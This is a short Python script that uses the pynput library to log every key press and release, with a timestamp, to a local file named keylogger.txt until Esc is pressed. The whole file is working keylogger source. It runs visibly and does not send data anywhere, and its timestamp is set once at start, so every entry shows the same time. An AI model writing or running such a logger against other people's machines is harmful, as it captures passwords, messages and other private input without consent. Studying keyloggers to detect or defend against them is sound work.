import pynput
from pynput import keyboard
from datetime import datetime
now = datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
print("Start Execution ______")
def on_press(key):
    with open("keylogger.txt", "a") as f:
        f.write(dt_string)
        try:
            f.write('  {0} pressed '.format(key.char))
        except AttributeError:
            f.write('  {0} pressed '.format(key))
def on_release(key):
    with open("keylogger.txt", "a") as f:
        f.write('  {0} released'.format(key))
        f.write('\n')
        if key == 'None':
            print()
        if key == keyboard.Key.esc:
            # Stop listener
            return False
# Collect events until released
with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()